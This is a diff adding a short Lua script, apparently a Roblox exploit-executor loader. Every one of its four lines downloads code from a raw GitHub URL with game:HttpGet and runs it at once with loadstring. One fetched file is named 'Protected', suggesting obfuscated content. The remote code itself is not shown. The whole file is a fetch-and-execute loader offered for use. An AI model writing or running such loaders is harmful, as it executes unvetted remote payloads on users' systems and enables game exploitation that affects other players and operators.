@@ -1,0 +1,11 @@
+-- Script
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Kamalsaras/Testfile/main/Protected_7267311931397194.txt'))()
+
+-- Message
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Kamalsaras/Di/main/Message.txt'))()
+
+-- Scale
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Kamalsaras/ScaleNew/35cbe8ab99e1362ad2493f4f7026c29c72b44f57/Scale.txt'))()
+
+-- Command Information
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Kamalsaras/Info/main/Info.txt'))()
